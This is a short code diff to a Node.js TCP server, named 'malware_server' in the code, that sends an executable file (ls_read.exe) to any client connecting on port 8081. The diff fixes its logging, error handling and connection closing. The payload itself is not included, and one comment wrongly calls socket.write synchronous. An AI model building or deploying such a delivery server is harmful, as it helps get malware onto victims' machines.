@@ -6,8 +6,8 @@ const EXE_PATH = "./ls_read.exe";
 const malware_server = net.createServer({keepAlive: false}, connection => {
     // Note that we don't need an extra event listener to check for connection - since the callback happens *when* a connection event is fired
 
-    console.log(`Connected to: ${connection.address().address}:${connection.address().port}.`);
-    console.log(`Server running on ${connection.address().family}`);
+    console.log(`Connected to: ${connection.remoteAddress}:${connection.remotePort}.`);
+    console.log(`Server running on ${connection.remoteFamily}`);
 
     // Send the EXE file data upon connection
     fs.readFile(EXE_PATH, (err, data) => {
@@ -17,15 +17,23 @@ const malware_server = net.createServer({keepAlive: false}, connection => {
         }
         else
         {
-            // 🚨 socket.write is async
+            // 🚨 socket.write is sync
             connection.write(data, err => {
-                console.error(err);
-            }).then(() => {
-                console.log(`${EXE_PATH} has been sent to client.`);
-                console.log("");      // Just a new line
-            })
+                if (err)
+                {
+                    console.error(err);
+                }
+                else
+                {
+                    console.log("Data written.")
+                    console.log("");
+                }
+            });
         }
+
+        connection.end();
     })
 });
 
 malware_server.listen(8081);
+console.log("Server up and running on port 8081");
